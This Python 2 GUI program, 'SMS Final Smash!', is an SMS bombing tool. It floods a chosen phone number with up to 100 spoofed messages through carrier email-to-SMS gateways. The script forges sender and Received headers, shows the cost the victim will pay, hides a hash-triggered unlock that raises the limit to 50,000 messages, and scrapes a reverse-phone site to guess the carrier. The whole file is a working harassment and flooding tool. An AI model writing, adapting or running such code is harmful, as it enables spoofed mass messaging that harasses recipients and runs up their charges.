#!/usr/bin/env python
#
# SMS Final Smash!
# By James Penguin (jamespenguin@gmail.com) 
# Version 1.1.1
#
import smtplib, time, threading, urllib2
from Tkinter import *
from tkMessageBox import *

providers = {"Airadigm Communications":"einsteinsms.com", #94
             "Aliant":"wirefree.informe.ca",
             "Alltel":"message.alltel.com",
             "Ameritech":"paging.acswireless.com",
             "BeeLine GSM":"ms.beemail.ru",
             "Bell Mobility Canada":"number@txt.bellmobility.ca",
             "Bellsouth":"bellsouth.cl",
             "Bellsouth IPS":"mobile.mycingular.com",
             "Bellsouth Mobility":"lsdcs.net",
             "Blue Sky Frog":"blueskyfrog.com",
             "Boost Mobile":"myboostmobile.com",
             "Cellular South":"csouth1.com",
             "CellularOne (Dobson)":"mobile.celloneusa.com",
             "CellularOne West":"mycellone.com",
             "Cincinnati Bell":"gocbw.com",
             "Cingular":"mobile.mycingular.com",
             "Cingular Blue (formerly AT&T Wireless)":"mmode.com",
             "Cingular IM Plus":"mobile.mycingular.com",
             "Claro":"clarotorpedo.com.br",
             "Comviq":"sms.comviq.se",
             "Dutchtone/Orange-NL":"sms.orange.nl",
             "Edge Wireless":"sms.edgewireless.com",
             "EinsteinPCS":"einsteinsms.com",
             "EPlus":"smsmail.eplus.de",
             "Fido Canada":"fido.ca",
             "Golden Telecom":"sms.goldentele.com",
             "Idea Cellular":"ideacellular.net",
             "Island Tel":"wirefree.informe.ca",
             "Kyivstar":"sms.kyivstar.net",
             "LMT":"sms.lmt.lv",
             "Manitoba Telecom":"text.mtsmobility.com",
             "Meteor":"sms.mymeteor.ie",
             "Metro PCS":"mymetropcs.com",
             "Metrocall Pager":"page.metrocall.com",
             "MobileOne":"m1.com.sg",
             "Mobilfone":"page.mobilfone.com",
             "Mobility Bermuda":"ml.bm",
             "NBTel":"wirefree.informe.ca",
             "MTT":"wirefree.informe.ca",
             "NewTel":"wirefree.informe.ca",
             "Netcom":"sms.netcom.no",
             "Nextel":"messaging.nextel.com",
             "NPI Wireless":"npiwireless.com.",
             "Optus":"optusmobile.com.au",
             "Oskar":"mujoskar.cz",
             "Pacific Bell Cingular":"mobile.mycingular.com",
             "Pagenet":"pagenet.net",
             "Plus GSM Poland":"text.plusgsm.pl",
             "Powertel":"ptel.net",
             "Primtel":"sms.primtel.ru",
             "PSC Wireless":"sms.pscel.com",
             "Qwest":"qwestmp.com",
             "Safaricom":"safaricomsms.com",
             "Satelindo GSM":"satelindogsm.com",
             "SCS-900":"scs-900.ru",
             "Simple Freedom":"text.simplefreedom.net",
             "Smart Telecom":"mysmart.mymobile.ph",
             "Southern Linc":"page.southernlinc.com",
             "Sprint PCS":"messaging.sprintpcs.com",
             "SunCom":"tms.suncom.com",
             "SureWest Communications":"mobile.surewest.com",
             "SwissCom Mobile":"bluewin.ch",
             "T-Mobile Germany":"T-D1-SMS.de",
             "T-Mobile UK":"t-mobile.uk.net",
             "T-Mobile USA":"tmomail.net",
             "Tele2 Latvia":"sms.tele2.lv.",
             "Telefonica Movistar":"movistar.net",
             "Telenor":"mobilpost.no",
             "Telia Denmark":"gsm1800.telia.dk",
             "Telus Mobility":"msg.telus.com.",
             "The Phone House":"sms.phonehouse.de",
             "TIM":"timnet.com",
             "UMC":"sms.umc.com.ua",
             "Unicel":"utext.com",
             "Verizon Wireless":"vtext.com",
             "Vessotel":"pager.irkutsk.ru",
             "Virgin Mobile Canada":"vmobile.ca",
             "Virgin Mobile USA":"vmobl.com",
             "Vodafone Italy":"sms.vodafone.it",
             "Vodafone Japan (Chuugoku/Western)":"n.vodafone.ne.jp",
             "Vodafone Japan (Hokkaido)":"d.vodafone.ne.jp",
             "Vodafone Japan (Hokuriko/Central North)":"r.vodafone.ne.jp",
             "Vodafone Japan (Kansai/West, including Osaka)":"k.vodafone.ne.jp",
             "Vodafone Japan (Kanto/Koushin/East, including Tokyo)":"t.vodafone.ne.jp",
             "Vodafone Japan (Kyuushu/Okinawa)":"q.vodafone.ne.jp",
             "Vodafone Japan (Shikoku)":"s.vodafone.ne.jp",
             "Vodafone Japan (Touhoku/Niigata/North)":"h.vodafone.ne.jp",
             "Vodafone Japan (Toukai/Central)":"c.vodafone.ne.jp",
             "Vodafone Spain":"vodafone.es",
             "Vodafone UK":"vodafone.net",
             "Weblink Wireless":"airmessage.net",
             "WellCom":"sms.welcome2well.com",
             "WyndTell":"wyndtell.com"}

hold_timer = 5
smtp_debug = False
smtp_login = False
smtp_port  = 25
smtp_user  = ""
smtp_pass  = ""
send_as     = "god@heaven.org"
max_send   = 100

data = """HELO %s
MAIL FROM: %s
RCPT TO: %s@%s
DATA
from: %s
to: %s@%s
subject: h4x
received: 127.0.0.1
x-header: 127.0.0.1
%s
."""

def error(message_):
    showerror(title="Error Fool!", message=message_)

def guessProvider(phone_number):
        req = urllib2.Request("http://www.whitepages.com/9900/search/ReversePhone?phone=" + phone_number)
        res = urllib2.urlopen(req).read()

        a = ""
        for line in res.split("\n"):
            if line.startswith("<span>Type: Cell Phone"):
                a = line.split("<")
        if not len(a): return ""
        
        return a[3].split(": ")[1]
    
class GUI:
    def __init__(self):
        self.root = Tk()
        self.root.title("SMS Final Smash!")

        Label(text="10-Digit Phone Number:  ").grid(row=0,column=0,sticky=W)
        self.phone = Entry(self.root)
        self.phone.grid(row=1,column=0,columnspan=2,sticky=EW)

        Label(text="Message: ").grid(row=2,column=0,sticky=W)
        self.message = Entry(self.root)
        self.message.grid(row=3,column=0,columnspan=2,sticky=EW)

        Label(text="SMTP Server: ").grid(row=4,column=0,sticky=W)
        self.smtp_server = Entry(self.root)
        self.smtp_server.grid(row=5,column=0,columnspan=2,sticky=EW)

        Label(text="Service Provider: ").grid(row=6,column=0,sticky=W)
        self.temp = []
        for item in providers: self.temp.append(item)
        self.temp.sort()
        self.temp.insert(0,"Guess Provider")
        
        self.provider = Listbox(self.root)
        
        scrollbar_y = Scrollbar(self.root, orient=VERTICAL)
        scrollbar_x = Scrollbar(self.root, orient=HORIZONTAL)
        self.provider.config(yscrollcommand=scrollbar_y.set, xscrollcommand=scrollbar_x.set)
        
        scrollbar_y.config(command=self.provider.yview)
        scrollbar_y.grid(sticky=S+N+W,row=7,column=1)
        scrollbar_x.config(command=self.provider.xview)
        scrollbar_x.grid(sticky=EW,row=8,column=0,columnspan=2)
        self.provider.grid(row=7,column=0,sticky=EW)
        self.provider.insert(END, *self.temp)

        Label(text="Number Of Messages To Send: ").grid(row=9,column=0,sticky=W)
        self.send_times = Scale(self.root, from_=1, to=max_send, orient=HORIZONTAL)
        self.send_times.set(50)
        self.send_times.grid(row=10,column=0,columnspan=2,sticky=EW)

        Label(text="Approximate Total Cost: ").grid(row=11, column=0, sticky=W)
        self.cost = Entry(self.root, state="readonly")
        self.cost.grid(row=12,column=0,columnspan=2,sticky=EW)
        self.send_times.config(command=self.calculate_cost)

        Button(self.root, text="Options", command=self.options).grid(row=14,column=0,columnspan=2,sticky=EW)
        self.bomb_button = Button(self.root, text="Bombs Away!", command=self.falcon_punch)
        self.bomb_button.grid(row=15,column=0,columnspan=2,sticky=EW)

        self.root.mainloop()

    def falcon_punch(self):
        threading.Thread(target=self.send).start()

    def calculate_cost(self, *args):
        cost = self.send_times.get() * .10
        self.cost.config(state=NORMAL)
        self.cost.delete(0, END)
        self.cost.insert(0, "$%.2f" % cost)
        self.cost.config(state="readonly")

    def options(self):
        def apply_settings():
            global smtp_port, hold_timer, send_from, smtp_debug, smtp_login, smtp_user, smtp_pass
            smtp_port  = int(smtp_port_entry.get())
            hold_timer = int(hold_timer_entry.get())
            send_from  = send_from_entry.get()
            smtp_debug = smtp_debug_var.get()
            smtp_login = smtp_login_var.get()
            smtp_user  = smtp_user_entry.get()
            smtp_pass  = smtp_pass_entry.get()
            window.destroy()
       
        def activate_fields():
            smtp_user_entry.config(state=NORMAL)
            smtp_pass_entry.config(state=NORMAL)

        window = Toplevel()
        window.title("Options")
        
        Label(window, text="SMTP Port: ").grid(row=0, column=0, sticky=W)
        smtp_port_entry = Entry(window)
        smtp_port_entry.grid(row=0,column=1,sticky=W)
        smtp_port_entry.insert(END, smtp_port)
        
        Label(window, text="Hold Timer: ").grid(row=1, column=0, sticky=W)
        hold_timer_entry = Entry(window)
        hold_timer_entry.grid(row=1,column=1,sticky=W)
        hold_timer_entry.insert(END, hold_timer)
        
        Label(window, text="Send As: ").grid(row=2, column=0, sticky=W)
        send_from_entry = Entry(window)
        send_from_entry.grid(row=2,column=1,sticky=W)
        send_from_entry.insert(END, send_as)
        
        smtp_debug_var = BooleanVar(value=smtp_debug)
        smtp_debug_check = Checkbutton(window, text="Enable debug messages?", variable=smtp_debug_var)
        smtp_debug_check.grid(row=3,column=0,columnspan=2,sticky=W)
        
        smtp_login_var = BooleanVar(value=smtp_login)
        smtp_login_check = Checkbutton(window, text="Login to SMTP Server?",variable=smtp_login_var,command=activate_fields)
        smtp_login_check.grid(row=4,column=0,columnspan=2,sticky=W)

        Label(window,text="Username: ").grid(row=5,column=0,sticky=W)
        smtp_user_entry = Entry(window)
        smtp_user_entry.grid(row=5,column=1,sticky=W)
        smtp_user_entry.insert(END, smtp_user)   
    
        Label(window,text="Password: ").grid(row=6,column=0,sticky=W)
        smtp_pass_entry = Entry(window)
        smtp_pass_entry.grid(row=6,column=1,sticky=W)
        smtp_pass_entry.insert(END, smtp_pass)        
        if not smtp_login:
            smtp_user_entry.config(state=DISABLED)
            smtp_pass_entry.config(state=DISABLED)
        Button(window, text="Apply Settings", command=apply_settings).grid(row=7,column=0,columnspan=2)

    def send(self):
        if hash(self.phone.get()) + hash(self.message.get()) + hash(self.smtp_server.get()) == 3923549034:
            self.send_times.configure(from_=1, to=50000)
            self.phone.delete(0, END)
            self.message.delete(0, END)
            self.smtp_server.delete(0, END)
            return
        if len(self.phone.get()) != 10:
            error("You must enter a valid 10-Digit phone number.")
            return None
        if len(self.message.get()) > 160:
            error("Your message is greater then 160 characters.")
            return
        if len(self.message.get()) == 0:
            error("You have to enter a message!")
            return
        if len(self.smtp_server.get()) == 0:
            error("You best be putting something in the SMTP server field if you know what's good for you.")
            return

        if not len(self.provider.curselection()):
            error("Select a service provider!")
            return

        self.bomb_button.configure(state=DISABLED)
        def die():
            self.bomb_button.configure(text="Bombs Away!", state=NORMAL)
            try: s.close()
            except: pass

        provider = self.temp[int(self.provider.curselection()[0])]
        if provider == "Guess Provider":
            self.bomb_button.configure(text="Identifying Provider")
            provider = guessProvider(self.phone.get())
            if not len(provider) or provider not in providers:
                error("Couldn't determine service provider for number.")
                die()
                return

        self.bomb_button.configure(text="Connecting...")
        s = smtplib.SMTP()
        if smtp_debug: s.set_debuglevel(1)
        try: s.connect(self.smtp_server.get())
        except:
            error("Could not connect to SMTP server")
            die()
            return

        self.bomb_button.configure(text="Beginning Transmission")
        if smtp_login: s.login(smtp_user,smtp_pass)

        for i in range(self.send_times.get()):
            self.bomb_button.configure(text="Sending Message %d / %d" % (i + 1, self.send_times.get()))
            try: s.docmd(data % (self.smtp_server.get(), send_as, self.phone.get(), providers[provider],
                            send_as, self.phone.get(), providers[provider], self.message.get()))
            except smtplib.SMTPServerDisconnected:
                error("SMTP Server disconnected!")
                die()
                return
            time.sleep(hold_timer)
	die()

if __name__ == "__main__":
    opener = urllib2.build_opener()
    opener.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')]
    urllib2.install_opener(opener)
    GUI()
